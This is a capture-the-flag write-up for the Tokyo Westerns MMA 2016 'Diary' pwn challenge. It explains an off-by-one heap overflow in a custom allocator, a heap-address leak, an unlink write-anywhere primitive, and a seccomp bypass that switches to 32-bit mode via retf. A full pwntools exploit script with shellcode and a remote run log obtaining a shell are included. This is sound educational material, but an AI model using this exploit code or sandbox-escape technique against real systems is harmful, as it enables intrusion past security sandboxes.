---
layout: post
title: Tokyo Westerns MMA 2016 - Diary
category: [Exploitation]
tags: [Exploitation, MMA]
comments: true
---

**Points:** 300
**Solves:** 14
**Category:** Exploitation
**Description:** You can use "./bash", if necessary.

> [Diary]({{site.url}}/assets/diary)

Unfortunately we didn't solve this challenge during the competition but only afterwards with the help of Ricky from PPP on how to bypass the seccomp sandbox. However, the solution blew my mind so bad, that I just had to document and share the exploitation method. Enjoy...

It's a 64bit binary and before Main in the init constructor we have the following functions executed:

{% highlight C %}
int init() {
    setbuf(stdin, 0x0);
    setbuf(stdout, 0x0);

    init_heap();

    rax = init_seccomp();
    return rax;
}
{% endhighlight %}

`init_heap` mmaps a new page with `rwx` permissions that's going to be used as a heap structure. `init_seccomp` runs seccomp with filter to blacklist the following syscalls

{% highlight text %}
2   - __NR_open
56  - __NR_clone
57  - __NR_fork
58  - __NR_vfork
59  - __NR_execve
85  - __NR_creat
257 - __NR_openat
322 - __NR_execveat
{% endhighlight %}

## Main

If we run the application, we can see that it's just as the name says, a diary. It allows you to input a date and a note.

{% highlight text %}
➜  diary ./diary
Welcome to diary management service

Menu :
1.Register      2.Show      3.Delete        0:Exit
>> 1

Add entry to diary
Input date
(range : 1970/01/01 ~ 2016/12/31) ... 1970/1/1
Input content size... 5

Please write what happened on 1970/01/01
>> AAAA
Registration Complete! :)

1.Register      2.Show      3.Delete        0:Exit
>> 2

Show entry
01 : 1970/01/01
Input date ... 1970/1/1
1970/01/01
AAAA

1.Register      2.Show      3.Delete        0:Exit
>> 0
Bye!
{% endhighlight %}

And if look at the disassembly, we can see there's not much going on. A non vulnerable `getInt` function to take our menu choice and if statements for each of the functions `register_entry`, `show_entry`, `delete_entry` and `exit`.

### Register_entry

In this function we see a call to a non vulnerable function `Input_date` that asks us for a date in the specified format and properly checks for the date range. After it returns it allocates a chunk on the heap (whenever I say the heap, I mean the fake heap created by the mmaped page with rwx permissions) of size 0x20 and copies the date struct there. Next it asks us for a positive int size for the note which passes to malloc. Next, this malloc chunk for the note and the `int size+1` are passed to the `getnline` function for input. The `getnline` function is going to read `int size+1`, and if you are familiar with the heap's structure this additional byte can overwrite the next chunk's metadata, and this is exactly what we are going to exploit.

Date struct:

{% highlight C %}
typedef struct {
    int year;
    char month;
    char day;
} date;

struct heap_date_node {
    date dat;
    char* note;
    date* next;
    date* prev;
}
{% endhighlight %}

### Show_entry

This function walks the sorted date list, grabs the date entry we would like to print and prints its' content. We are going to use this function to leak the address of the heap without actually using any memory corruption vulnerabilities.

### Delete_entry

Delete_entry first finds the date entry structure we would like to delete, unlinks it from the list and frees the associated chunks. The big thing here is that all the heap manipulating functions `malloc/free/unlink_freelist` are home-made by the organizers and part of the main module, they are not libc functions ! That means we can literally apply any heap exploitation method known to mankind.

## Exploit

First we need to leak the address of the heap. How to do that? By allocating two small chunks, freeing them and allocating a bigger chunk of size the sum of the two small chunks. This will cause the two smaller chunks to be linked in the free-list. This just means that the bigger chunk's data section will contain pointers to the heap. Next we allocate just enough data to reach the `chunk1->next*`, and since the data for the note is not null terminated when we print the bigger show with `show_entry` it will leak that pointer.

To create a write anywhere condition, we are going to exploit the `unlink_freelist` function. This function runs when it needs to coalesce two neighboring free chunks. 

{% highlight C %}

void unlink_freelist( free_chunk ){
    free_chunk->prev->next = next;
    free_chunk->next->prev = prev;
}

{% endhighlight %}

And how to create two adjacent free chunks while controlling their `next` and `prev` pointers ? Well, using the `int size+1` vulnerability in `getnline`. We can malloc two chunks of exactly 32 bytes and overwrite the next chunk's metadata with a byte which LSB is 0. Now we have a chunk with data field under our control but marked as free in the next chunk's metadata.

Simply put, we need to create two free chunks and place the `address(-8)` we want to write to in `chunk[8:16]` and the data we want to write in `chunk[:8]`, then free that chunk.

## Bypassing SECCOMP

Here comes the crazy part ! So we have write anywhere anything and we have the address of the heap which is `rwx`. We can just place shellcode there and replace exit@GOT with the address of the shellcode. Yea, if only we could execute execve... remember, seccomp ?

Apparently we can switch the mode from 64bit to 32bit and execute 32bit shellcode with execve being a different syscall seccomp can't stop us anymore ! And switching the mode seems to be very easy, all we have to do is use the `retf` (return far) instruction which is going to pop 2 values off the stack. The first being the regular value for EIP and the second for the `CS` register, 0x23 for 32bit mode and 0x33 for 64bit mode.

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

def register(year, month, day, size, data, n):
    r.sendline('1')
    r.recvuntil(' ... ')
    r.sendline(str(year)+'/'+str(month)+'/'+str(day))
    msg = r.recv(14)
    if 'Wrong date ;(' in msg:
        r.recvuntil('>> ')
        return
    else:
        r.sendline(str(size))
        r.recvuntil('>> ')
        if n:
            r.sendline(data)
        else:
            r.send(data)
        r.recvuntil('>> ')

def show(year, month, day):
    r.sendline('2')
    r.recvuntil('Show entry\n')
    data = r.recvuntil('\nInput date ... ').strip('\nInput date ... ')
    r.sendline(str(year)+'/'+str(month)+'/'+str(day))
    r.recvline()
    data2 = r.recvuntil('\n\n').strip()
    r.recvuntil('>> ')
    return data, data2


def delete(year, month, day):
    r.sendline('3')
    r.recvuntil('Input date ... ')
    r.sendline(str(year)+'/'+str(month)+'/'+str(day))
    r.recvuntil('>> ')

def exploit(r):
    r.recvuntil('>> ')
    register(1980, 1, 1, 32, "C" * 32, 0)
    register(1980, 1, 2, 32, "C" * 32, 0)
    delete(1980, 1, 1)
    delete(1980, 1, 2)

    register(1980, 1, 3, 64, "\xeb\x7f" + "D" * 46, 0)
    d1, d2 = show(1980, 1, 3)
    heap = u64(d2[48:].ljust(8, '\0'))
    log.info("leak: " + hex(heap))


    sc = ('''
    xor rax, rax
    mov al, 9
    inc al
    mov rdi, 0x602000
    mov rsi, 0x1000
    mov rdx, 7
    syscall

    mov rax, 0
    xor rdi, rdi
    mov rsi, 0x602190
    mov rdx, 27
    syscall

    xor rsp, rsp
    mov esp, 0x602160
    mov DWORD PTR [esp+4], 0x23
    mov DWORD PTR [esp], 0x602190
    retf
    ''')

    payload = "\x90" * 0x60
    payload += asm(sc, os='linux', arch='amd64') + "\x00"

    register(1980, 1, 5, 0x100, payload, 0)

    e = ELF('diary')

    payload = p64(heap-0x50)
    payload += p64(e.got['exit']-8)
    payload += "C" * 8
    payload += "D" * 8
    register(1970, 2, 2, 32, payload, 1)
    register(1970, 3, 3, 32, "B"*32, 1)
    delete(1970, 2, 2)

    r.sendline('0')

    r.sendline(asm(shellcraft.i386.linux.execve('./bash'), arch='x86'))

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/mma/diary/diary'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

{% highlight text %}
 diary python ./diary.py pwn1.chal.ctf.westerns.tokyo 13856
[*] For remote: ./diary.py HOST PORT
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 13856: Done
[*] leak: 0x7fcad79c8080
[*] '/vagrant/mma/diary/diary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
[*] Switching to interactive mode
Bye!
$ echo *
bash diary flagflag_oh_i_found
$ read -r line < flagflag_oh_i_found
$ echo $line
TWCTF{bl4ckl157_53cc0mp_54ndb0x_15_d4ng3r0u5}
$

{% endhighlight %}

* Thanks again [Ricky Zhou](https://twitter.com/riczho)
